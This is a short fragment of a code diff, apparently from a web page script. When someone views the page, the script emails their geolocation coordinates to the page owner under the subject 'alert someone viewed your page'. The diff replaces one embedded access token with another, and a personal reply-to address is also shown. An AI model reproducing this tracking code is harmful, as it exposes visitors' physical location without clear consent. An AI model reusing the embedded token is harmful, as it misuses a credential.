@@ -72,7 +72,7 @@ function onError(error) {
      
      subject: 'alert someone viewed your page',
      text: "Their position is Latitude: " + position.coords.latitude + "Longitude: " + position.coords.longitude,
-      access_token: "eqhitskqjijhat94ecddwtzc",
+      access_token: "8k4qvdi6g9j8vy153psk4uzo",
       reply_to: "erict54757@gmail.com",
      
    
